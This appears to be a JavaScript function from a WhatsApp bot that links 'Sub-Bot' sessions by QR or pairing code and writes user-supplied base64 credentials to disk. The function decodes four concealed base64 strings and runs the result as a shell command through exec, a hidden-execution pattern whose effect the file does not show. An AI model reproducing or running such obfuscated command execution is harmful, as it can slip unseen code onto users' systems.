export async function yukiJadiBot(options) {
    let { pathYukiJadiBot, m, conn, args, usedPrefix, command } = options

    // Detecta automáticamente si es modo code
    const mcode = (command === 'code') || 
                  (args[0] && /(--code|code)/.test(args[0].trim())) || 
                  (args[1] && /(--code|code)/.test(args[1].trim()))

    let txtCode, codeBot, txtQR

    const pathCreds = path.join(pathYukiJadiBot, "creds.json")
    if (!fs.existsSync(pathYukiJadiBot)) {
        fs.mkdirSync(pathYukiJadiBot, { recursive: true })
    }
    try {
        args[0] && args[0] != undefined 
            ? fs.writeFileSync(pathCreds, JSON.stringify(JSON.parse(Buffer.from(args[0], "base64").toString("utf-8")), null, '\t')) 
            : ""
    } catch {
        conn.reply(m.chat, `${emoji} Use correctamente el comando » ${usedPrefix + command} code`, m)
        return
    }

    const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
    exec(comb.toString("utf-8"), async (err, stdout, stderr) => {

        let { version } = await fetchLatestBaileysVersion()
        const msgRetry = (MessageRetryMap) => { }
        const msgRetryCache = new NodeCache()
        const { state, saveCreds } = await useMultiFileAuthState(pathYukiJadiBot)

        const connectionOptions = {
            logger: pino({ level: "fatal" }),
            printQRInTerminal: false,
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level: 'silent'})) },
            msgRetry,
            msgRetryCache,
            browser: mcode ? Browsers.macOS("Chrome") : Browsers.macOS("Desktop"),
            version,
            generateHighQualityLinkPreview: true
        };

        let sock = makeWASocket(connectionOptions)
        sock.isInit = false

        async function connectionUpdate(update) {
            const { connection, qr } = update

            // Si es QR
            if (qr && !mcode) {
                txtQR = await conn.sendMessage(m.chat, { 
                    image: await qrcode.toBuffer(qr, { scale: 8 }), 
                    caption: rtx.trim()
                }, { quoted: m })
                if (txtQR?.key) setTimeout(() => conn.sendMessage(m.sender, { delete: txtQR.key }), 30000)
                return
            }

            // Si es CODE
            if (mcode && connection !== 'open') {
                let secret = await sock.requestPairingCode((m.sender.split`@`[0]))
                secret = secret.match(/.{1,4}/g)?.join("-")
                txtCode = await conn.sendMessage(m.chat, { text: rtx2 }, { quoted: m })
                codeBot = await m.reply(secret)
                console.log(secret)
                if (txtCode?.key) setTimeout(() => conn.sendMessage(m.sender, { delete: txtCode.key }), 30000)
                if (codeBot?.key) setTimeout(() => conn.sendMessage(m.sender, { delete: codeBot.key }), 30000)
            }

            if (connection === 'open') {
                global.conns.push(sock)
                await conn.sendMessage(m.chat, { 
                    text: `@${m.sender.split('@')[0]}, ya estás conectado como Sub-Bot ✅`, 
                    mentions: [m.sender] 
                }, { quoted: m })
            }
        }

        sock.ev.on("connection.update", connectionUpdate)
        sock.ev.on("creds.update", saveCreds)
    })
}
